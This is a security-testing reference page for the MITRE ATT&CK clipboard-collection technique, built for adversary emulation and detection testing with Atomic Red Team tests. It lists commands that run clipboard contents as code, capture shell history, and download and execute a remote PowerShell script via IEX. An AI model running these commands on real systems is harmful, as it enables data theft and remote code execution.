# T1115 Clipboard Data

## High-Level Description

Adversaries may collect data stored in the clipboard from users copying information within or between applications.

For example, on Windows adversaries can access clipboard data by using <code>clip.exe</code> or <code>Get-Clipboard</code>. Additionally, adversaries may monitor then replace users’ clipboard with their data (e.g., Transmitted Data Manipulation).

macOS and Linux also have commands, such as <code>pbpaste</code>, to grab clipboard contents.

## Kill Chain Phase

- Collection (TA0009)

**Platforms:** Linux, macOS, Windows

## What to Check

- [ ] Identify if Clipboard Data technique is applicable to target environment
- [ ] Check Linux systems for indicators of Clipboard Data
- [ ] Check macOS systems for indicators of Clipboard Data
- [ ] Check Windows systems for indicators of Clipboard Data
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Utilize Clipboard to store or execute commands from

Add data to clipboard to copy off or execute commands from.

**Supported Platforms:** windows

```cmd
dir | clip
echo "T1115" > %temp%\T1115.txt
clip < %temp%\T1115.txt
```

### Atomic Test 2: Execute Commands from Clipboard using PowerShell

Utilize PowerShell to echo a command to clipboard and execute it

**Supported Platforms:** windows

```powershell
echo Get-Process | clip
Get-Clipboard | iex
```

### Atomic Test 3: Execute commands from clipboard

Echo a command to clipboard and execute it

**Supported Platforms:** macos

```bash
echo ifconfig | pbcopy
$(pbpaste)
```

### Atomic Test 4: Collect Clipboard Data via VBA

This module copies the data stored in the user's clipboard and writes it to a file, $env:TEMP\atomic_T1115_clipboard_data.txt

**Supported Platforms:** windows

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Set-Clipboard -value "Atomic T1115 Test, grab data from clipboard via VBA"
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1115\src\T1115-macrocode.txt" -officeProduct "Word" -sub "GetClipboard"
```

**Dependencies:**

- Microsoft #{ms_product} must be installed

### Atomic Test 5: Add or copy content to clipboard with xClip

Utilize Linux Xclip to copy history and place in clipboard then output to a history.txt file. Successful execution will capture history and output to a file on disk.

**Supported Platforms:** linux

```bash
apt install xclip -y
history | tail -n 30 | xclip -sel clip
xclip -o > history.txt
```

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Clipboard Data by examining the target platforms (Linux, macOS, Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1115 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

No specific mitigations documented for this technique.

## Detection

### Clipboard Data Access with Anomalous Context
